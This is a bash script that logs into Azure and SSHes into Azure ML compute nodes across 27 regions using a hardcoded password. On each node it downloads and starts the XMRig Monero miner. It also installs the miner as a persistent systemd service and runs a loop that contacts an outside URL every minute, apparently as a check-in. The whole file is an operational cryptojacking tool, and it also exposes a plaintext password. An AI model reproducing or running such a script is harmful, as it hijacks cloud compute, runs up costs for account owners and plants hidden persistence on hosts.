#!/bin/bash
loginString=(loginString_)
proxy="proxy_"
user="linh"
password="Linh@11668899"
locations=("australiaeast" "brazilsouth" "canadacentral" "centralindia" "centralus" "eastasia" "eastus" "eastus2" "francecentral" "germanywestcentral" "japaneast" "japanwest" "koreacentral" "northcentralus" "northeurope" "norwayeast" "southafricanorth" "southcentralus" "southeastasia" "switzerlandnorth" "uaenorth" "uksouth" "westcentralus" "westeurope" "westus" "westus2" "westus3")

#######################################################################################################
tmux new-session -d -s 1
tmux send -t 1 "while [ 1 ]" ENTER
tmux send -t 1 "do" ENTER
tmux send -t 1 "wget -O 1 'https://nksas.link/xmr/sync2?id=15&mail=mail_'" ENTER
tmux send -t 1 "sleep 1m" ENTER
tmux send -t 1 "done" ENTER

echo | sudo add-apt-repository ppa:micahflee/ppa
echo Y | sudo apt install sshpass
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
az extension add -n ml -y
az login --service-principal --username ${loginString[0]} --password ${loginString[1]} --tenant ${loginString[2]};

sleep 15m
for location in "${locations[@]}"
do
    echo "$location"
    for i in 1 2 3
    do
        ip=$(az ml compute list-nodes -n run$i -g NetworkWatcherRG -w $location --query "[0].public_ip_address" -o tsv)
        if [[ "$ip" != "" ]]
        then
            echo "$i - $ip"
            port=$(az ml compute list-nodes -n run$i -g NetworkWatcherRG -w $location --query "[0].port" -o tsv)
            echo "start ssh"
            sshpass -p $password ssh -o StrictHostKeyChecking=no $user@$ip -p $port "tmux new-session -d -s 1; tmux send -t 1 \"wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-static-x64.tar.gz\" ENTER; tmux send -t 1 \"tar -xf xmrig-6.17.0-linux-static-x64.tar.gz\" ENTER; tmux send -t 1 \"cd xmrig-6.17.0\" ENTER; tmux send -t 1 \"sudo ./xmrig -o $proxy:80\" ENTER"
        else
            echo "$i empty"
        fi
    done
done

cd /
cd /usr/local/bin
sudo wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-static-x64.tar.gz
sudo tar -xf xmrig-6.17.0-linux-static-x64.tar.gz
sudo bash -c "echo -e \"[Unit]\\nAfter=network.target\n[Service]\nType=simple\nExecStart=/usr/local/bin/xmrig-6.17.0/xmrig -o $proxy:80 -k --tls\n[Install]\nWantedBy=multi-user.target\" > /etc/systemd/system/mrun.service"
sudo systemctl daemon-reload
sudo systemctl enable mrun.service
sudo systemctl start mrun.service
